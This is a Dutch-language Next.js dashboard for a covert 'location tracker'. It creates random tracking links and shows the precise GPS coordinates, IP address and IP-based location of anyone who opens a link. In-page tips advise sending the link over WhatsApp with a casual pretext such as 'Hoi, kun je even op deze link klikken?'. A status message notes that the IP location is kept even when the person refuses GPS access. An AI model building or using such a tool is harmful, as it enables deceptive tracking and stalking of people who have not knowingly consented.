"use client";

import { useEffect, useState } from "react";

interface LocationData {
  trackingId: string;
  type: "ip" | "gps" | "gps_denied";
  latitude?: number;
  longitude?: number;
  accuracy?: number;
  ip?: string;
  ipLocation?: {
    city?: string;
    region?: string;
    country?: string;
    lat?: number;
    lon?: number;
  };
  error?: string;
  timestamp: string;
  userAgent?: string;
}

export default function Dashboard() {
  const [locations, setLocations] = useState<LocationData[]>([]);
  const [loading, setLoading] = useState(true);
  const [newLinkId, setNewLinkId] = useState("");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const fetchLocations = async () => {
    try {
      const response = await fetch("/api/locatie");
      const data = await response.json();
      setLocations(data);
    } catch (e) {
      console.error("Fout bij ophalen locaties:", e);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchLocations();
    // Ververs elke 10 seconden
    const interval = setInterval(fetchLocations, 10000);
    return () => clearInterval(interval);
  }, []);

  const generateLink = () => {
    const id = Math.random().toString(36).substring(2, 10);
    setNewLinkId(id);
  };

  const copyLink = async (id: string) => {
    const link = `${window.location.origin}/vind/${id}`;
    await navigator.clipboard.writeText(link);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const openGoogleMaps = (lat: number, lon: number) => {
    window.open(`https://www.google.com/maps?q=${lat},${lon}`, "_blank");
  };

  const formatTime = (timestamp: string) => {
    return new Date(timestamp).toLocaleString("nl-NL", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });
  };

  // Groepeer locaties per trackingId
  const groupedLocations = locations.reduce((acc, loc) => {
    if (!acc[loc.trackingId]) {
      acc[loc.trackingId] = [];
    }
    acc[loc.trackingId].push(loc);
    return acc;
  }, {} as Record<string, LocationData[]>);

  return (
    <div className="min-h-screen bg-gray-50 p-4 md:p-8">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="bg-white rounded-2xl shadow-lg p-6 mb-6">
          <h1 className="text-2xl font-bold text-gray-800 mb-2">
            📍 Locatie Tracker Dashboard
          </h1>
          <p className="text-gray-500">
            Maak een link aan en stuur deze via WhatsApp
          </p>
        </div>

        {/* Link Generator */}
        <div className="bg-white rounded-2xl shadow-lg p-6 mb-6">
          <h2 className="text-lg font-semibold text-gray-700 mb-4">
            Nieuwe tracking link maken
          </h2>
          
          <button
            onClick={generateLink}
            className="bg-blue-500 hover:bg-blue-600 text-white font-medium py-3 px-6 rounded-xl transition-colors"
          >
            + Nieuwe link genereren
          </button>

          {newLinkId && (
            <div className="mt-4 p-4 bg-blue-50 rounded-xl">
              <p className="text-sm text-gray-600 mb-2">Je tracking link:</p>
              <div className="flex flex-col sm:flex-row gap-2">
                <code className="flex-1 bg-white p-3 rounded-lg text-sm break-all border">
                  {typeof window !== "undefined" && `${window.location.origin}/vind/${newLinkId}`}
                </code>
                <button
                  onClick={() => copyLink(newLinkId)}
                  className="bg-green-500 hover:bg-green-600 text-white font-medium py-2 px-4 rounded-lg transition-colors whitespace-nowrap"
                >
                  {copiedId === newLinkId ? "✓ Gekopieerd!" : "📋 Kopieer"}
                </button>
              </div>
              <p className="text-xs text-gray-500 mt-3">
                💡 Tip: Stuur deze link via WhatsApp met een bericht zoals: &quot;Hoi, kun je even op deze link klikken?&quot;
              </p>
            </div>
          )}
        </div>

        {/* Locaties */}
        <div className="bg-white rounded-2xl shadow-lg p-6">
          <div className="flex justify-between items-center mb-4">
            <h2 className="text-lg font-semibold text-gray-700">
              Ontvangen locaties
            </h2>
            <button
              onClick={fetchLocations}
              className="text-blue-500 hover:text-blue-600 text-sm font-medium"
            >
              🔄 Vernieuwen
            </button>
          </div>

          {loading ? (
            <div className="text-center py-8 text-gray-500">
              Laden...
            </div>
          ) : Object.keys(groupedLocations).length === 0 ? (
            <div className="text-center py-8 text-gray-400">
              <div className="text-4xl mb-2">📭</div>
              <p>Nog geen locaties ontvangen</p>
              <p className="text-sm mt-1">Maak een link en stuur deze via WhatsApp</p>
            </div>
          ) : (
            <div className="space-y-4">
              {Object.entries(groupedLocations)
                .sort((a, b) => {
                  const latestA = Math.max(...a[1].map(l => new Date(l.timestamp).getTime()));
                  const latestB = Math.max(...b[1].map(l => new Date(l.timestamp).getTime()));
                  return latestB - latestA;
                })
                .map(([trackingId, locs]) => {
                  const gpsLoc = locs.find(l => l.type === "gps");
                  const ipLoc = locs.find(l => l.type === "ip");
                  const latestLoc = locs[locs.length - 1];

                  return (
                    <div key={trackingId} className="border rounded-xl p-4 hover:shadow-md transition-shadow">
                      <div className="flex justify-between items-start mb-3">
                        <div>
                          <span className="text-xs font-mono bg-gray-100 px-2 py-1 rounded">
                            {trackingId}
                          </span>
                          <span className="ml-2 text-xs text-gray-400">
                            {formatTime(latestLoc.timestamp)}
                          </span>
                        </div>
                        <button
                          onClick={() => copyLink(trackingId)}
                          className="text-xs text-blue-500 hover:text-blue-600"
                        >
                          {copiedId === trackingId ? "✓" : "📋"}
                        </button>
                      </div>

                      {/* GPS Locatie (meest nauwkeurig) */}
                      {gpsLoc && gpsLoc.latitude && gpsLoc.longitude && (
                        <div className="bg-green-50 rounded-lg p-3 mb-2">
                          <div className="flex justify-between items-center">
                            <div>
                              <span className="text-green-700 font-medium text-sm">
                                📍 Exacte GPS locatie
                              </span>
                              <p className="text-xs text-green-600 mt-1">
                                {gpsLoc.latitude.toFixed(6)}, {gpsLoc.longitude.toFixed(6)}
                                {gpsLoc.accuracy && ` (±${Math.round(gpsLoc.accuracy)}m)`}
                              </p>
                            </div>
                            <button
                              onClick={() => openGoogleMaps(gpsLoc.latitude!, gpsLoc.longitude!)}
                              className="bg-green-500 hover:bg-green-600 text-white text-sm font-medium py-2 px-3 rounded-lg"
                            >
                              🗺️ Open kaart
                            </button>
                          </div>
                        </div>
                      )}

                      {/* IP Locatie (bij benadering) */}
                      {ipLoc?.ipLocation && (
                        <div className="bg-yellow-50 rounded-lg p-3 mb-2">
                          <div className="flex justify-between items-center">
                            <div>
                              <span className="text-yellow-700 font-medium text-sm">
                                🌐 IP locatie (bij benadering)
                              </span>
                              <p className="text-xs text-yellow-600 mt-1">
                                {[ipLoc.ipLocation.city, ipLoc.ipLocation.region, ipLoc.ipLocation.country]
                                  .filter(Boolean)
                                  .join(", ")}
                              </p>
                            </div>
                            {ipLoc.ipLocation.lat && ipLoc.ipLocation.lon && (
                              <button
                                onClick={() => openGoogleMaps(ipLoc.ipLocation!.lat!, ipLoc.ipLocation!.lon!)}
                                className="bg-yellow-500 hover:bg-yellow-600 text-white text-sm font-medium py-2 px-3 rounded-lg"
                              >
                                🗺️ Open kaart
                              </button>
                            )}
                          </div>
                        </div>
                      )}

                      {/* GPS geweigerd */}
                      {locs.some(l => l.type === "gps_denied") && !gpsLoc && (
                        <div className="bg-red-50 rounded-lg p-3 mb-2">
                          <span className="text-red-700 font-medium text-sm">
                            ⚠️ GPS toegang geweigerd
                          </span>
                          <p className="text-xs text-red-600 mt-1">
                            De persoon heeft de locatie niet gedeeld, maar we hebben wel de IP locatie
                          </p>
                        </div>
                      )}

                      {/* Extra info */}
                      <div className="text-xs text-gray-400 mt-2">
                        IP: {latestLoc.ip || "onbekend"}
                      </div>
                    </div>
                  );
                })}
            </div>
          )}
        </div>

        {/* Info */}
        <div className="mt-6 text-center text-xs text-gray-400">
          <p>Data wordt automatisch elke 10 seconden ververst</p>
        </div>
      </div>
    </div>
  );
}
